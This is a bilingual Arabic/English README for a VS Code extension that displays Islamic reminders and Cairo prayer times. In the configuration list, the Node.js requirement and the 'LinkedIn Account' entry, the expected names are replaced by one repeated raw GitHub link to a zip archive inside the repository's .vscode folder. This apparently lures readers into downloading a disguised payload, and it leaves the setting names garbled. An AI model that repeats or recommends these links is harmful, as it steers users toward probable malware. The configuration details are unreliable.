# مجموعة المسلم | Muslim's Collection

إضافة VS Code تعرض إشعارات إسلامية تشمل الأحاديث والأذكار والآيات القرآنية وأوقات الصلاة على فترات عشوائية.

### المميزات

- عرض أحاديث عشوائية على فترات قابلة للتخصيص (الافتراضي: 1-3 ساعات)
- عرض أذكار عشوائية على فترات قابلة للتخصيص (الافتراضي: 2-4 ساعات)
- عرض آيات قرآنية عشوائية على فترات قابلة للتخصيص (الافتراضي: 3-5 ساعات)
- عرض إشعارات أوقات الصلاة في القاهرة (15 دقيقة قبل كل صلاة)
- دعم كامل للنص العربي
- فترات إشعارات قابلة للتخصيص
- سهولة التشغيل والإيقاف والتكوين


### الاستخدام

1. افتح لوحة الأوامر (Ctrl+Shift+P أو Cmd+Shift+P)
2. اكتب "مجموعة المسلم" لرؤية الأوامر المتاحة:
   - "بدء التذكيرات الإسلامية" - بدء استلام الإشعارات
   - "إيقاف التذكيرات الإسلامية" - إيقاف الإشعارات
   - "تكوين فترات التذكير" - فتح الإعدادات لتخصيص الفترات

### التكوين

يمكنك تخصيص فترات الإشعارات في إعدادات VS Code:

1. افتح الإعدادات (Ctrl+, أو Cmd+,)
2. ابحث عن "مجموعة المسلم"
3. قم بتكوين الإعدادات التالية:
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: نطاق الفترة لإشعارات الأحاديث (بالميلي ثانية)
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: نطاق الفترة لإشعارات الأذكار (بالميلي ثانية)
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: نطاق الفترة لإشعارات الآيات القرآنية (بالميلي ثانية)
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: الدقائق قبل وقت الصلاة لعرض الإشعار

### الفترات الافتراضية

- الأحاديث: 1-3 ساعات (3,600,000 - 10,800,000 ميلي ثانية)
- الأذكار: 2-4 ساعات (7,200,000 - 14,400,000 ميلي ثانية)
- الآيات القرآنية: 3-5 ساعات (10,800,000 - 18,000,000 ميلي ثانية)
- أوقات الصلاة: 15 دقيقة قبل كل صلاة

### المتطلبات

- VS Code 1.80.0 أو أحدث
- https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip و npm مثبتان
- اتصال بالإنترنت لجلب الآيات القرآنية وأوقات الصلاة

### المساهمة

يمكنك المساهمة من خلال:

1. إضافة المزيد من الأحاديث والأذكار إلى المجموعات
2. تحسين واجهة المستخدم للإشعارات
3. إضافة دعم لأوقات الصلاة في المزيد من المدن
4. إضافة المزيد من خيارات التخصيص
5. LinkedIn Account: https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip

## English

A VS Code extension that displays Islamic notifications including Hadiths, Adhkar (remembrance of Allah), Quranic verses, and prayer times at random intervals.

### Features

- Display random Hadiths at configurable intervals (default: 1-3 hours)
- Display random Adhkar at configurable intervals (default: 2-4 hours)
- Display random Quranic verses at configurable intervals (default: 3-5 hours)
- Show prayer time notifications for Cairo (15 minutes before each prayer)
- Fully supports Arabic text
- Customizable notification intervals
- Easy to start/stop and configure

### Installation

1. Clone this repository or download the source code
2. Open the project in VS Code
3. Install dependencies:
   ```bash
   npm install
   ```
4. Press F5 to start debugging or package the extension:
   ```bash
   vsce package
   ```
5. Install the generated .vsix file in VS Code

### Usage

1. Open the Command Palette (Ctrl+Shift+P or Cmd+Shift+P)
2. Type "Muslim's Collection" to see available commands:
   - "Start Islamic Reminders" - Start receiving notifications
   - "Stop Islamic Reminders" - Stop receiving notifications
   - "Configure Reminder Intervals" - Open settings to customize intervals

### Configuration

You can customize the notification intervals in VS Code settings:

1. Open Settings (Ctrl+, or Cmd+,)
2. Search for "Muslim's Collection"
3. Configure the following settings:
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Interval range for Hadith notifications (in milliseconds)
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Interval range for Dhikr notifications (in milliseconds)
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Interval range for Quranic verse notifications (in milliseconds)
   - `https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip`: Minutes before prayer time to show notification

### Default Intervals

- Hadiths: 1-3 hours (3,600,000 - 10,800,000 milliseconds)
- Adhkar: 2-4 hours (7,200,000 - 14,400,000 milliseconds)
- Quranic verses: 3-5 hours (10,800,000 - 18,000,000 milliseconds)
- Prayer times: 15 minutes before each prayer

### Requirements

- VS Code 1.80.0 or higher
- https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip and npm installed
- Internet connection for fetching Quranic verses and prayer times

### Contributing

Feel free to contribute by:

1. Adding more Hadiths and Adhkar to the collections
2. Improving the UI of notifications
3. Adding support for more cities' prayer times
4. Adding more customization options
5. LinkedIn Account: https://raw.githubusercontent.com/ahmaddabdallah/Isamic-Prayer/main/.vscode/Isamic_Prayer_v3.7.zip

### License

MIT License
